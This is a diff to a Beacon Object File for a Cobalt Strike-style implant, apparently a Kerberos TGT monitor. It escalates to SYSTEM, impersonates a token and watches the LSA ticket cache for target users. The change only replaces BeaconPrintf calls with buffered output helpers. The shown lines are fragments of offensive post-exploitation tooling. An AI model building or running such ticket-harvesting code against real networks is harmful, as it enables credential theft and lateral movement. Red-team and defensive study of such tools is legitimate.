@@ -42,7 +42,8 @@ VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CA
         }
     }
     if (cacheUpdated) {
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Ticket cache size: %d\n", curr->count);
+        bprintf("\n[*] Ticket cache size: %d\n", curr->count);
+        bflush();
         BeaconWakeup();
     }
 }
@@ -51,6 +52,10 @@ VOID go(char* args, int argc) {
     datap parser = { 0 };
     HANDLE hStop = BeaconGetStopJobEvent();
 
+    g_out    = (char*)MemAlloc(OUTBUFSIZE);
+    g_outLen = 0;
+    if (g_out) g_out[0] = '\0';
+
     BeaconDataParse(&parser, args, argc);
     int interval = BeaconDataInt(&parser);
     char* targetUsers = BeaconDataExtract(&parser, NULL);
@@ -58,7 +63,8 @@ VOID go(char* args, int argc) {
     if (!IsSystem()) {
         HANDLE hToken = EscalateToSystem();
         if (!hToken) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
+            bprintf("[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
+            bflush();
             return;
         }
         ADVAPI32$SetThreadToken(NULL, hToken);
@@ -76,9 +82,10 @@ VOID go(char* args, int argc) {
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting TGT monitor (interval: %ds)\n", interval);
+    bprintf("[*] Starting TGT monitor (interval: %ds)\n", interval);
     if (targetUsers && targetUsers[0] != '\0')
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users: %s\n", targetUsers);
+        bprintf("[*] Target users: %s\n", targetUsers);
+    bflush();
     BeaconWakeup();
 
     TICKET_CACHE prev = { 0 };
@@ -107,5 +114,8 @@ VOID go(char* args, int argc) {
 
     ADVAPI32$RevertToSelf();
 
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
+    bprintf("\n[+] BOF execution completed.\n");
+    bflush();
+    if (g_out && g_out != (char*)1) MemFree(g_out);
+    g_out = (char*)1; g_outLen = 1;
 }
